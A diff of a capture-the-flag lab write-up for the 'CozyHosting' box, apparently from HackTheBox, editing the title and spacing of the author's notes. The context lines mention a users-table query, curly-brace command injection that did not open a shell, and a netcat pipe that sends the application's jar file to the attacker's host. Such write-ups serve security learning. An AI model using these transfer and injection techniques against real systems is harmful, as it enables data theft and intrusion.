@@ -1,4 +1,4 @@
-# CozyHosting \[Linux Easy]
+# CozyHosting \[Easy]
 
 ## Report
 
@@ -29,10 +29,8 @@ select * from users;
 the curly brace expansion didnt work to launch the shell but worked to ping
 transfer file and unzip didnt work - had to do it on system : End-of-central-directory signature not found.
 
-
 nc -nlvp 1234 > cloudhosting-0.0.1.jar
 cat cloudhosting-0.0.1.jar | nc 10.10.14.23 1234
-
 ```
 
 ## Loot
